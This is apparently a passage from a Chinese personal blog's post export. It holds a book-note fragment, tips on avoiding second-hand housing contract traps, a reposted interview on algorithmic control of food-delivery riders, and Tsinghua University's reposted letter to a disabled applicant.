<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>高铭，男，汉族。生于上世纪 70 年代的北京。目前任职于某公司项目总监。</p>
<p>自认为死心眼一根筋，对于探索未知事物总是有无尽渴望。从学龄前就已经有了至今仍然挂在嘴边的口头禅：“为什么？”成年后曾一度沉迷于宗教、哲学、量子物理、非线性动力学、心理学、生物学、天体物理等学科。21 世纪以来又开始对精神病患、心理障碍者、边缘人的内心世界产生了强烈好奇。</p>
<p>2004—2008 年间，通过各种渠道，利用所有的闲暇时间，探访精神病院、公安部等机构，对“非正常人群”进行近距离访谈，并加工整理出了这本书的内容。</p>
<p>“我从未想到居然有这么多人鼓励并欣赏这些内容，长久以来，我一直以为自己是个疯子。但是，我很欣慰。”</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>开始的几个问题感觉还是很不错的,打破惯性思维、勇于拆掉思维的墙. 关于女人的 X 染色体基因数是一千多,而男人的 Y 染色体是几十个,得出女人最终要统治地球的结论果然很让人很精神,女人的世界男人理解不了,这些也是以后的事了,当下并没有这些的研究来论证这个问题.</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>别草率签名！教你如何避开二手房合同陷阱！</title>
    <url>/2019/05/21/%E6%9D%82%E4%BE%83/%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E9%81%BF%E5%BC%80%E4%BA%8C%E6%89%8B%E6%88%BF%E5%90%88%E5%90%8C%E9%99%B7%E9%98%B1/</url>
    <content><![CDATA[<p>由于二手房的交易纷繁复杂，因此买卖双方最终的实际情况也会千差万别。故而小编建议各位购房者在签订二手房买卖合同时更要多加注意，当心遇到陷阱。</p>
<a id="more"></a>
<p><img src="/2019/05/21/杂侃/教你如何避开二手房合同陷阱/1.jpg" alt></p>
<h1 id="一、如何确定交房时间？"><a href="#一、如何确定交房时间？" class="headerlink" title="一、如何确定交房时间？"></a>一、如何确定交房时间？</h1><p>各位购房者需要特别注意＂不可抗力＂在合同中是如何界定的。房产销售合同一般都有＂销售方遇不可抗力导致逾期交房，不承担责任＂这样的表述。这项约定条款是否合理？其附带注解是否明确？这一点是购房者一般很容易忽略或者是不知其到底是哪种含义的。</p>
<h1 id="二、如何确定房屋面积？"><a href="#二、如何确定房屋面积？" class="headerlink" title="二、如何确定房屋面积？"></a>二、如何确定房屋面积？</h1><p>对于商品房这种特殊的商品，一般是允许合同约定的面积存有误差的，但是误差不应超过合理的范围，这个范围应该在合同中有明确规定。双方一旦约定了房屋面积的误差范围，卖方就应严格遵守。</p>
<p>如果误差超出约定的范围，实际上就是卖方违约，没有履行合同。但如果合同中没有约定明确的允许误差范围，一旦发生问题，无论误差超过或减少多少，法院可能判决购房者败诉，采取多退少补的方法进行结算。</p>
<p>比如：最后的实测面积比原来的初步测量面积一下子多出了 20 平米，如果当时合同里没有约定只能误差小于 10 平米。那么算下来，对购房者来说这笔支出可不是个小数目。</p>
<h1 id="三、如何查看物业？"><a href="#三、如何查看物业？" class="headerlink" title="三、如何查看物业？"></a>三、如何查看物业？</h1><p>在签定物业合同之前，应仔细阅读合同条款，看其中是否有不符合规定或对购房者有欺骗行为的条款。同时应对照物业收费标准仔细核对。标准中没有的收费项目，可要求对方出示有关部门的文件，否则有权拒交。</p>
<h1 id="四、“阴阳合同”有何风险？"><a href="#四、“阴阳合同”有何风险？" class="headerlink" title="四、“阴阳合同”有何风险？"></a>四、“阴阳合同”有何风险？</h1><p>“阴阳合同”是指除了签署一份实际成交价的合同之外，再签一个低于实际交易价的假合同。将假合同作为申报纳税的依据，以达到减少交税的目的。签订房屋买卖合同应当遵守国家政策法规有关规定，按照市场交易规则进行。</p>
<p>因为买卖双方签订阴阳合同的行为严重违反了我国税收管理的规定。如果属于一般偷税行为，行政机关有权给予罚款、拘留等行政处罚；如果偷税数额较大、次数较多，则可能构成犯罪。</p>
<p><img src="/2019/05/21/杂侃/教你如何避开二手房合同陷阱/2.jpg" alt></p>
<h1 id="五、如何确认真实卖房者？"><a href="#五、如何确认真实卖房者？" class="headerlink" title="五、如何确认真实卖房者？"></a>五、如何确认真实卖房者？</h1><p>二手房交易中，不仅有“假房主”，还有假不动产权证、假信息等。二手房交易中，经常出现不动产权证上的名字与卖房人不是同一个人的情况，因此购房者如果交了定金并与卖房人签了合同，如果买卖生变，追讨定金也是费时费力的事。</p>
<p>另外，也有骗子伪造户主身份，然后以各种理由骗取购房者信任，将本不属于自己的房子卖掉，拿到购房款后跑掉。购房者要认真审查二手房转让人的主体资格，确定房屋转让人是否是该房屋的产权人。</p>
<h1 id="六、如何避开中介陷阱？"><a href="#六、如何避开中介陷阱？" class="headerlink" title="六、如何避开中介陷阱？"></a>六、如何避开中介陷阱？</h1><p>大部分二手房都是通过中介来成交的，为了快速达成买卖协议来提取中介费，部分不法中介经常在合同上耍小聪明，蒙蔽买卖双方。买卖双方在签订合同时，最好把和中介有关的条款写入合同中，同时还要注意合同中隐藏的陷阱。</p>
<p>二手房交易时买方不应只注重房屋本身的价格，还要设定条款就中介的责任和义务约定违约责任。一旦中介、出卖人违约，买方可据此来维护权益，要求赔偿。此外，买卖双方还要注意查看交易当中涉及到中介公司的佣金和手续费等费用清单，避免引发纠纷。</p>
<h1 id="七、违约金的支付需要明确"><a href="#七、违约金的支付需要明确" class="headerlink" title="七、违约金的支付需要明确"></a>七、违约金的支付需要明确</h1><p>通常在拟定二手房交易合同时，为了避免二手房交易出现违约的情况，可以适当的规定违约金的赔付，而绝大多数的二手房买卖合同中违约金的比例都会有明确的条款注明，但对于赔付的时间没有明确的具体款项来规定，这会导致违约方能够依据这些来拖延支付的时间，这会使得条款包括了执行和约束力都会形同虚设，所以小粥给大家表明了，在签订合同中，一定要在合同里加入<br>“买房在实际支付应付款之日起规定期限内向卖方（买方）支付违约金”这条款项，这一条能够确保合同条款的最终落实性。</p>
<h1 id="八、所有费用（除房款外）的交接时间要明确"><a href="#八、所有费用（除房款外）的交接时间要明确" class="headerlink" title="八、所有费用（除房款外）的交接时间要明确"></a>八、所有费用（除房款外）的交接时间要明确</h1><p>出来房款的支付时间之外，由于二手房的所有水电气这些都是使用过的，一定要标注好水、电、煤气、物业、供暖等各项费用的交接好年月日。如果是公房的交易，对于物业和供暖等等的费用也同时要交纳时间和标准，原房主的单位中是否有一些是要更改或者重新要求的，卖方需要作出的和买方签署协议等等，这些一定要都要在二手房合同里明确写好。</p>
<h1 id="九、学会如何签订补充协议"><a href="#九、学会如何签订补充协议" class="headerlink" title="九、学会如何签订补充协议"></a>九、学会如何签订补充协议</h1><p>合同通常都是会由这两部分组成的，一部分合同正文，另一部分是补充协议，在买卖双方在签订合同的同时如果遇到合同款中不明确，或者需要进一步约定时，就要在原本合同的相关条款后面的空白行或者在合同后面填写附加条款，将合同中把意思写明白喽，这样就会减少在后续交易的阶段中因为条款的意思含混而造成不便和麻烦。</p>
<h1 id="十、一定要表明好房款交付时间和房子过户时间"><a href="#十、一定要表明好房款交付时间和房子过户时间" class="headerlink" title="十、一定要表明好房款交付时间和房子过户时间"></a>十、一定要表明好房款交付时间和房子过户时间</h1><p>如果在合同中没有写明这一点，卖方就会就这这一点而延后交房，卖方需要明确买方的付款时间，而同时尾款的支付时间一般是有赖于房产过户的日期，所以，买那个也有权利知道房产的过户时间。在合同中明确好这一条后，如果在执行期间出现逾期现象后，则依照实际情况有违约执行第七点里面的违约责任。</p>
]]></content>
      <categories>
        <category>杂侃</category>
        <category>房产</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>“数字控制”下的劳动秩序:外卖骑手的劳动控制研究</title>
    <url>/2021/05/11/%E6%9D%82%E4%BE%83/%E6%95%B0%E5%AD%97%E6%8E%A7%E5%88%B6%E4%B8%8B%E7%9A%84%E5%8A%B3%E5%8A%A8%E7%A7%A9%E5%BA%8F/</url>
    <content><![CDATA[<p><strong>摘要：</strong></p>
<p>陈龙是在一次系统的大调整中发现，外卖平台在压缩配送时间上永不满足，它们总在不断试探人的极限。那一天，他的所有外卖订单都超时了。</p>
<p>陈龙是北京大学社会学系博雅博士后，2018年，为了完成博士论文，他加入了北京中关村的一家外卖骑手团队，花了5个半月时间进行田野调查，每天送外卖，体验骑手的劳动过程。他好奇的是，几十万骑手如何在全国各个城市走街串巷，看似混乱却能做到井然有序。他的论文成果将在今年出版，他的所有调查始终围绕社会学中的一个核心命题：资本如何控制劳动者，而劳动者又是如何反抗的？</p>
<p><strong>以下是陈龙的口述：</strong></p>
<p><strong>秩序</strong></p>
<p>前几天不是有一位北京市人社局劳动关系处的副处长，他去跑了一天外卖，12个小时，送了5单，挣了41块钱，然后说心里很委屈，也很辛苦。以我的经验，他只是跑了一天，再跑两天就习惯了，习惯以后他不会觉得跑5单很辛苦，而是我还能跑，我可以跑30单、40单，甚至会抱怨平台，为什么不再给我多一点单子？因为你的劳动力极限已经慢慢被撑开了。</p>
<p>2018年3月初到8月中旬，我加入了北京中关村的一家外卖骑手团队，送了五个半月的外卖。那个团队是北京最早出现的骑手团队之一，当时的站长说过一句话，“咱们团队称得上全国单量第一的外卖团队。如果说全国的外卖团队看北京，那么北京的外卖团队就要看咱们了。”</p>
<p>我们每天9点在中关村广场集合，9点半开晨会，10点开始等单子。我第一天才跑了9单，当时费用还高点，送一单8块钱，我挣了72块。后来极限撑开了，我最多一天送了24单，那个时候甚至还想平台怎么不多派两单。我一般跑到下午3点就不跑了，因为电动车没电了，就会开始找骑手做一些访谈。大部分外卖员会备两块电池，一直跑到晚上八九点，平均每天能跑三四十单。</p>
<p>很多人一开始不知道我是北大的博士，不愿意搭理我，对我的身份会有疑心，觉得我不担心生计问题。后来知道了，就很多人愿意跟我聊天。他们觉得你是博士嘛，会来问我，将来干哪行哪行怎么样。</p>
<p>我的论文写的就是数字治理下的劳动秩序。劳动社会学的一个核心议题就是想知道劳动秩序，全国这么多城市，几十万的骑手，同时间在各地走街串巷，表面上看着很乱，但是他们背后有一个秩序。这个秩序在哪？你就会想了解到底是什么原因让这种井然有序成为可能。</p>
<p>那个时候我还没有想到用“算法”这个词，用的是“数字治理”。因为我在送外卖的过程中意识到，平台在不停地收集数据。通过智能手机和上面安装的配送软件，平台可以不断地追踪骑手的轨迹。到了室内，GPS信号一般会比较弱，但没多久平台就能通过商家的Wi-Fi网络、室内定位基站等等去收集记录骑手的数据，包括骑手的运动状态，到达商家的时间、停留的时长，消费者住址楼层、等待消费者取餐的时长等等。</p>
<p>我后来跟外卖平台的技术员接触过，他们告诉我不光是骑手身上的数据，商家的数据，包括每天订单的多少、重量、内容物，还有消费者的偏好，这些他们都可以知道。比如骑手送餐晚了，有消费者就会直接给一个差评，有些消费者可能连续几次都不会给差评。平台就会开始测算，给你一个预计送达的时间，对于好说话的消费者那可能时间多少都没关系，对于比较计较的人，平台可能就会故意地在送餐时间上多放点水，本来30分钟可以送达，平台给的时间是35分钟。</p>
<p>我们有一个说法叫“投喂”，所有的数据、每个人的习惯都可以让系统去学习和吸收。平台掌握了大量的数据，再用数据去给你规划怎么取餐、送餐，怎么给每个订单定价。我最后写的其实也是这一点，这样庞大复杂的劳动秩序之所以成为可能，是有这样一套数据支撑的系统，是把所有一切可以纳入的，都纳入到了可以计算的程度，是一种高度的控制和精准的预测。</p>
<p><img src="https://p6.itc.cn/q_70/images01/20210506/38a40909da804b57a1e5ed8a3afc04fd.jpeg" alt="img">等单间隙，一名外卖员在休息。</p>
<p><strong>“自发游戏”</strong></p>
<p>我送外卖那段时间，大部分时候也会抱怨一个事情，就是时间，特别是中午高峰期时段，单子真的特别多，也催得紧。这个时候你心里多少都会有点慌，因为你会来不及，通常也是这个时候最容易出事故。</p>
<p>我记得3月的时候，北京天还挺冷。当时我还没开始跑，处于观察状态，有一个骑手带着我跑，我们俩跑相同的距离，一样的时间，一起进了企业的电梯，他搁那儿喘气，汗珠子就从额头上往下冒。我就在想我跟他一块跑的，确实身上发了点热，但不至于到大冒汗这个程度。我就说你是不是累了？他说不是，我是心里面发慌。</p>
<p>外卖平台上最早送一单要一个小时，后来大家都在抢，谁能突破30分钟大关，最后他们现在能达到28分钟。压缩了那么多时间，一方面是技术上有更新，但这毕竟是很少的，因为计算机运算能力很强，它节省也就是几秒钟。于是你看到大部分节省下来的几十分钟时间，是靠骑手。</p>
<p>我印象很深刻的是2018年6月，系统做了一个很大的调整，就是为了提升时间。那天我所有订单都迟到了。</p>
<p>那次平台出现了一个“顾客期望到达时间”，原本这个订单的配送时间是45分钟，系统给你改成顾客期望你40分钟送到，但顾客那儿显示的不是40分钟，假如我42分钟送到，顾客看到的是我还没有超时。到底有没有超过，是由系统来判定，而这个判定标准是什么？没人知道。有些人超了两分钟判定他没超时，有些又判定超时了。</p>
<p>你可以把它看做是平台做的一次实验，测试你是不是还能跑得更快。那天大量骑手超时了，在群里大家反应就很激烈，直接开始骂人了，因为这个实验的代价和后果是骑手买单的。一旦超时，这单挣不上也就算了，还可能扣你个几十块钱，甚至停号。一停号就是半天或者一天不能跑，把你拉去做线下培训。</p>
<p>我之前做问卷调查，一个骑手在北京生活，一天睁眼就是100块钱的支出，包括房租、各种生活开销。所以可想而知，一个处罚，甚至停半天对他们的影响有多大。也就是那次给我一个很大的刺激，我发现平台在想尽办法压缩配送时间，他们在不断试探人的极限。</p>
<p>在这个过程中，骑手也会反抗。我后来研究，他们是不是真的具有自主性，是不是真的很自由？因为那时候都说送外卖很自由，上下班时间自由，不想干就不干了，好像角色权利很大。但做完调查，我发现这种反抗，其实力量很微弱。数据会对你的自主性造成挤压。</p>
<p>平台有自己的一套游戏规则去管理骑手，比如庞大的数据库，还有用游戏等级给骑手划分标准，从青铜、白银、黄金到星耀骑手，鼓励骑手多接单，一级一级往上升。骑手也有“自发游戏”。</p>
<p>我记得当时我们去人大知行公寓楼送外卖，人大只允许骑手从校园北门进去，所以系统给你计算送餐时间的时候，会以北门作为测算依据，导航也会让你从北门进。北门到知行公寓的骑行距离大概是800多米，要花4分钟时间。但后面就有人发现，知行公寓旁边有一个侧门，电动车开不进去，但人下来走两步就进去了，很方便，步行时间不超过半分钟。所以很多骑手就会改变路径，提前完成知行公寓的送餐任务，节省下来的时间可以跑其他订单。</p>
<p>这相当于是系统中的一个漏洞，骑手也发挥了自己的主观能动性，按照自己的决策和想法去做我要做的事情。但很多人都这么做了以后，平台也发现了，它就会给你压缩时间，堵上这个“漏洞”。骑手找近路节省的时间原本是可以用来休息或者跑更多订单的，但由于系统敏锐的“数据控制”，它能很快根据骑手的轨迹更新路线，最后可能就导致原先的30分钟变成25分钟。</p>
<p>平台推着骑手去找捷径，找到了之后，我按你的新捷径来设计标准。骑手的自主性实际上最终还是可能会被压缩到非常小的一个范围。</p>
<p>你会发现技术的进步好像并没有让人生活得更好，科技的便捷是永远赶不上甲方的需求的，当你完成了现在的任务量，永远会有不断涌现的新需求。它在不断地把人陷入内卷的道路当中。</p>
<p>我们为什么会对时间这么苛刻？是一开始就这样吗？还是我们被平台建构了这样的想法？我觉得我们需要反思。</p>
<p>而且这个过程当中也涉及到人的极限的拓展，你说时间还能降吗，可能也还能再降一降。我最近的一篇文章提到一个概念叫“超级流动”，想说的是外卖骑手跑得越来越快，这个流动的背后是有原因的，就是资本增值的一个需求。</p>
<p>在马克思看来，资本在生产当中投入的时间越多，在流通环节投入时间越少，资本增值就越大。从这个角度讲，平台只能是希望流通过程越短越好，最好是菜刚做出来就能马上送给你，恨不得你在家尝到的跟你在饭店尝到的是一样的体验，你就愿意花很高价钱买它对吧？所以这本质上是符合资本积累的逻辑的，最终的趋向就是他们会越跑越快。</p>
<p><img src="https://p5.itc.cn/q_70/images01/20210506/ffea4b30c457429e8c05468131d7d452.jpeg" alt="img">除夕，外卖骑手仍在工作。</p>
<p><strong>隐身的平台</strong></p>
<p>外卖行业里有一个控制权重新分配的问题。管理一般是三方面，第一就是指导工作，员工按照老板的指导去做。第二是要评估员工工作当中的表现，第三是根据评估，决定给员工奖励还是惩罚。放以前的话，这三项工作都是老板决定的。</p>
<p>而现在呢，你会发现boss都不管了。谁来指导？平台给骑手开单，平台根据导航告诉他们先送哪个，再送哪个。消费者决定给差评还是好评。最后的奖惩又是平台根据消费者的评估来决定。你会发现这个“老板”找不着，一个看不见摸不着的软件系统在负责第一项和第三项工作，第二项交给了消费者。</p>
<p>控制权一分配，相应的矛盾就跟着被牵引到了其他地方。技术遮蔽了对应的劳资关系，骑手即便有不满，也不知道找谁发泄，甚至有可能发泄错了地方。我当时就发现很多骑手是在真情实感地骂手机系统，觉得问题都是这个傻X系统造成的。还有一点，外卖企业的架构是一层一层往下加的，有区域经理、加盟商、站长等等，老板到底是谁，骑手已经找不着了。他们只能对着系统发泄。</p>
<p>而在消费者角度，他们并不了解背后的奖惩规则，这套规则是严重失衡的。我送外卖的时候，一个好评能加两块钱，一个差评扣10块，投诉扣200块，处罚的力度远远大于奖励的力度。所有人都害怕被处罚。有时候消费者给一个差评，骑手跑一单才8块，最后还倒欠两块，那可能“噌”地一下，骑手情绪就上来了。</p>
<p>更可笑的一件事是，当消费者和骑手产生矛盾后，平台反而成为了一个仲裁者。它负责判断谁对谁错，而这原本应该是平台或者说资本该负的责任。</p>
<p>你看平台发的一些报告，尤其像美团说疫情期间，骑手的数量不降反升，看着好像一切都很好。但这个行业到底好不好，你要看它的流动率高不高。如果流动率很高，说明它留不住人，那说明它本身还是有问题的。</p>
<p>我当时的访谈对象基本都已经不在这个行业了。我论文里的主人公是甘肃人，原本想在家开小饭馆，也没干起来，欠了很多债，他就到北京来送外卖。他住的就是城中村，骑手都会聚集在类似的地方，10平方米左右的空间要住三四个人，条件也不好，他来北京两个月没有洗过澡。</p>
<p>他干了一年多，每天可能就送三四十单。除了他自己的吃穿用度什么的，能攒下来一半钱就不错了，还挺累的。2019年他就回甘肃了，在老家卖房子。</p>
<p>去年跟朋友吃饭，我还碰到了论文里另一个比较重要的主人公。当时我们在坐电梯，他拿着手机进来了，我们都戴着口罩，但我们互相看了一眼就认出对方了，也没说话，直接就抱在了一块。抱完了以后我才问他，你还在干这个？就这样聊了两句。他还要赶着送餐。他是少数还在干外卖的。</p>
<p><img src="https://p1.itc.cn/q_70/images01/20210506/0f36c30de7e5491c857bbb7ae484fb2c.jpeg" alt="img">骑手在大雪中送外卖。</p>
<p>我对女骑手也感兴趣，她们在这个群体占了8%左右的比例，但好像关于她们的报道很少。我最早观察女骑手发现大致有三种类型，第一种就是年纪比较大的，四五十岁。第二种从外貌上看比较男性化，很多理了个平头。第三种是小媳妇类型，一般是跟她老公一块干。</p>
<p>这个行业是男性主导的，女性进入的话多少有点不容易，所以她们在策略上要往男性这个方向靠，要抛弃掉一些女性化的特征。有男骑手就会挺鄙夷地说，那已经不算女的了。</p>
<p>但一个很有特色的地方是，到了冬天，大家都裹得严严实实的，蓝的黄的骑手制服，你看不出性别。但女骑手都会裹一条围巾，红的、黄的，很鲜艳的。我觉得这也是她们主动要的，去标识出她们女性的身份。</p>
<p>跟2018年比的话，我觉得骑手的处境可能是更糟糕了。你想2018年送一单的价格是8块，现在下跌到5块。他们要保证收入不下跌，只能不断地内卷，付出更长的工作时间，压缩每一单的配送时间，送更多的订单。</p>
<p>2018年我觉得换工作可能是一种反抗方式，但我现在已经不这么认为了，因为大家都在做平台，都是零工经济，你自以为走出一个牢笼，实际可能是进入一个新的牢笼。但没办法，因为很多骑手自身的条件就决定了，他不可能在劳动力市场上占据主导权。</p>
<p>（改变）很难。除非是平台想改变，或者是政府出台相关的政策，不然的话没有办法。所以我觉得北京劳动关系处的副处长去体验送外卖是有必要的。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2021&amp;filename=SHXJ202006006&amp;v=X83ZBCNMzYUIlU2727grhBdumJaa9PKvWg9qTT4SQN%mmd2FI509ru86u2iylvpHm%mmd2FHDp" target="_blank" rel="noopener">“数字控制”下的劳动秩序——外卖骑手的劳动控制研究 - 中国知网 (cnki.net)</a></p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>人生实苦，但请你足够相信！</title>
    <url>/2017/11/03/%E6%9D%82%E4%BE%83/%E4%BA%BA%E7%94%9F%E5%AE%9E%E8%8B%A6%EF%BC%8C%E4%BD%86%E8%AF%B7%E4%BD%A0%E8%B6%B3%E5%A4%9F%E7%9B%B8%E4%BF%A1/</url>
    <content><![CDATA[<p>这两天，甘肃考生魏祥的经历牵动了很多人的心。在魏祥发出求助信后，清华大学招生办专门写出回信，表示将尽最大努力帮助他，这封回信，同样令人动容。残疾学子自强不息的奋斗与名校自强不息气质的交响，让人听到了情怀和境界的声音——</p>
<p>再过两个月，有一群人生得意、金榜题名的孩子将入读北京西北郊的那座曾经的皇家园林——清华园。在那里，将有很多来自欠发达地区的同学，这或许是他们第一次离开家乡，来到北京。他们可能不会那么有见识、有自信，但是他们跟许多人一样经历了奋斗，只是那奋斗是如此不同……</p>
<p>6月26日，微信公众号“大美甘肃”发表了《一位甘肃高分(648分)考生的请求》。请求来自“苦甲天下的甘肃定西”高三考生魏祥，定西一中毕业生。他先天性脊柱裂、椎管内囊肿，出生后双下肢运动功能丧失，更不幸的是下岗多年的爸爸又早逝，只有坚强的妈妈陪着残疾但优秀的儿子一路求学，直至考上清华！他的这份请求，只是希望清华能给他们母子俩帮助解决一间陋宿，供娘儿俩济身而已。</p>
<p><img src="https://i.imgur.com/3UZXpCG.jpg" alt></p>
<p>图为甘肃学子魏祥<br><a id="more"></a></p>
<p>魏祥在今年高考中取得了648分的优异成绩，已经报考清华大学。他希望清华大学能提供一间宿舍，能让自己和母亲一同前往，方便他顺利完成大学学业。</p>
<p>甘肃学子魏祥向清华大学求助的信得到清华大学校长邱勇以及社会各界关注。</p>
<p>更令人感动的是清华大学招生组的爱心和情怀，连夜对该同学的请求进行回应和处理，这真是实实在在的精准扶贫。</p>
<p><img src="https://i.imgur.com/2iZBHBg.jpg" alt></p>
<p>清华大学招办主任刘震于26日晚10：43分左右在微信中留言如下： “我是清华大学招办主任刘震。魏祥同学已经报考我校。我校老师已经与他取得联系，为他提供一切尽可能的资助！清华不会让任何一位优秀学生因为经济原因而辍学！”</p>
<p>27日下午，清华大学招办以《人生实苦，但请你足够相信》为题专门致信魏祥，称将最大努力资助魏祥。</p>
<p>以下为清华大学招办给魏祥回信原文</p>
<p><strong>亲爱的魏祥同学：</strong></p>
<p>　　见字如面。</p>
<p>　　首先恭喜你即将来到清华大学，继续你的学习和生活。我们看到了你写给清华大学的文章《一位甘肃高分考生的请求》，相信你早已具备了清华人自强不息、厚德载物的品质，我们代表清华园欢迎来自甘肃定西的你！</p>
<p>　　《繁星·春水》中有这样一首小诗：“童年啊，是梦中的真，是真中的梦，是回忆时含泪的微笑。”想来这句话应该符合你的童年记忆吧。在梦一般的年华里，却要承受含泪的记忆，这泪水不包含欢喜，不代表留恋。不幸的人生，各有各的悲苦。但万幸的是，你在经历疾病和丧亲之痛后，依然选择了坚强和努力，活成了让我们都尊敬和崇拜的样子。</p>
<p>　　你说“一个多月的住院治疗，我和妈妈相依为命，身心深受煎熬，我的身体几经折磨，痛不欲生，妈妈的精神濒临崩溃，孤零零的她没了爸爸的陪伴和支撑，可怜无比。”只言片语，我们知晓你母亲道阻且长的育子之路，更深切地感受到了你作为儿子对母亲深沉的爱和歉疚。但正如你所说，今日以高分佳绩考入清华，就是给了妈妈一份殷殷的报恩之礼！ </p>
<p>　　邱勇校长在2015级新生开学典礼上曾说：“我是1983年进入清华的。我知道，无论那时还是现在，能够来到清华上学都是不容易的，你们在成长过程中一定遇到过各种各样的困难和挑战。”同样，对于你来说，来路或许不易，命运或许不公，人生或许悲苦，但是请你足够相信，相信清华，相信这个园子里的每一位师生，因为我们都在为一种莫名的东西付出，我想这应该就是情怀。党委书记陈旭老师也曾寄语自强计划的学生：“自强就要做到自主，大学能收获什么取决于自己怎么去努力。”所以也请你相信自己，可以在清华园里找到热爱，追求卓越。</p>
<p>　　读到你的来信后，清华大学招生办公室主任刘震老师在该微信文章下留言道“魏祥同学已经报考我校。我校老师已经与他取得联系，为他提供一切尽可能的资助！清华不会让任何一位优秀学生因为经济原因而辍学！”确实，清华大学多有与你有同样经历的学子，在家庭经济与身体因素的双重压力下，依然奋发图强。他们或携笔从戎，守护家国平安；或回馈基层，在公益组织中施展才能；或致知穷理，一举夺得清华大学本科生特等奖学金的殊荣……</p>
<p>　　现在，你的情况受到了清华师生、校友和社会各界的关注。昨天深夜，邱勇校长专门打来电话，关心你的录取情况和入校后的生活安排情况；陈旭老师也请学生部门第一时间对接，妥善安排解决你的后顾之忧。清华大学学生资助管理中心的老师也极力配合，在你被确认录取后会立刻开始资助。清华大学多位校友也在看到消息的第一时间，主动提出资助和协助你治疗的意愿，后续学校相关部门都会跟进落实。请你相信，校内外有足够多的支持，清华不会错过任何一位优秀学子！</p>
<p>　　冰心赠葛洛的一首诗中说“爱在左，情在右，在生命的两旁，随时撒种，随时开花，将这一径长途点缀得花香弥漫，使得穿花拂叶的行人，踏着荆棘，不觉痛苦，有泪可挥，不觉悲凉。”在清华园里的所有学子，无论是生活困顿，抑或身体抱恙，都会有“爱” 与“情” 相伴。相信未来的你，也会和活跃在各领域的清华学子们一样，穿花拂叶，除却一身困顿，成就自己的不同凡响。</p>
<p>　　感谢社会各界人士对魏祥同学和我校本科招生工作的关注和关心。在此，我们想对在求学路上荆棘丛生的学子们说：人生实苦，但请你足够相信！</p>
<p>清华大学招生办公室</p>
<p>2017年6月27日</p>
<p>一位甘肃高分(648分)考生的请求</p>
<p>我叫魏祥，男，汉族，现年19岁，家住苦甲天下的甘肃定西，定西一中高三毕业生。</p>
<p>　　本人因先天性脊柱裂、椎管内囊肿，出生后双下肢运动功能丧失，大小便失禁，爸爸妈妈在我半岁、两岁定时先后奔赴定西市医院、西安西京医院，寻求专家为我手术治疗疾病，但两次手术病情均未见好转，身体残疾情况没有得到改善，更不幸的是下岗多年的爸爸又身患不治之症，医治无效于2005年去世，留下年幼无知身体残疾的我和年轻无助的妈妈。</p>
<p>　　坚强伟大的妈妈在悲痛欲绝的日子里，不但没有放弃过对我细心无微的照顾，反而更加疼爱我，竭尽全力为我付出，并省吃俭用，除供我上学之外，她将少得可怜的工资多一分都舍不得花积攒下来，为我治病。于2008年6月，妈妈再次背着我踏上了北去的火车，寻求北京天坛医院神经外科专家，为我实施第三次手术治疗。1个多月的住院治疗，我和妈妈相依为命，身心深受煎熬，我的身体几经折磨，痛不欲生，妈妈的精神频临奔溃，孤零零的她没了爸爸的陪伴和支撑，可怜无比，更使我再次深感妈妈的艰辛不易与伟大。可是不争气的我，3次手术都未能改善我的身体状况，残疾依旧，且随着年龄增长残疾日趋严重。</p>
<p>　　钢铁般坚强的妈妈，擦干了眼泪，一如既往，风雨无阻背我上学。从小学中学到高中，12年如一日，妈妈的背影穿梭于小学中学到高中的大街小巷、校门、教室，好像她从来不知疲倦；12年的妈妈不仅仅是一名医院上班的护士，更是一位残疾少年求学路上的陪读者，守护神；12年的妈妈身教残儿志不残，历尽沧桑终不悔；12年的我竭尽全力，克服身体残障，刻苦求学，完成了中小学阶段的基础教育，今日以648的高考成绩，给了我深爱的妈妈一份殷殷的报恩之礼，同时也给了不断关心呵护我，鼓励我，培养我的各阶段的恩师一份比较满意的答卷。</p>
<p>　　今有幸遇见举世闻名的清华大学老师，且有意备录我圆大学之梦，得此喜讯，我母子俩狂喜之余，又新添愁云，由于我的身体原因，无论我走到哪里，这辈子都离不开亲人的随身陪护，以照顾我的衣食住行，生活起居，妈妈为了陪我上学无奈放弃工作，仅有的经济来源将要斩断……在此，我恳切希望贵校在接纳我的同时，能够给我母子俩帮助解决一间陋宿，仅供我娘儿俩济身而已，学生我将万分万分感谢！！</p>
<p>这样身残志坚的学生，在清华已经不是第一位了。今年已经在清华攻读研究生的矣晓沅，自幼患上类风湿性关节炎致残，也是在母亲的陪伴下完成了清华的四年本科学习，而且还拿到了清华学霸才能染指的特等奖学金！</p>
<p>最后，借用清华招办回信中的一句话，向所有经历坎坷，却足够强大的年轻人致意：</p>
<p><img src="https://i.imgur.com/m26wNrX.jpg" alt></p>
<blockquote>
<h4 id="转自"><a href="#转自" class="headerlink" title="转自:"></a>转自:</h4></blockquote>
<p><a href="http://www.gywb.cn/content/2017-10/02/content_5610572.htm" target="_blank" rel="noopener">清华致甘肃考生魏祥：人生实苦，但请你足够相信</a></p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>我曾走在崩溃的边缘</title>
    <url>/2019/06/04/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%88%91%E6%9B%BE%E8%B5%B0%E5%9C%A8%E5%B4%A9%E6%BA%83%E7%9A%84%E8%BE%B9%E7%BC%98/</url>
    <content><![CDATA[<p><img src="/2019/06/04/读书笔记/我曾走在崩溃的边缘/20190604102604.png" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><h2 id="【编辑推荐】"><a href="#【编辑推荐】" class="headerlink" title="【编辑推荐】"></a>【编辑推荐】</h2><ol>
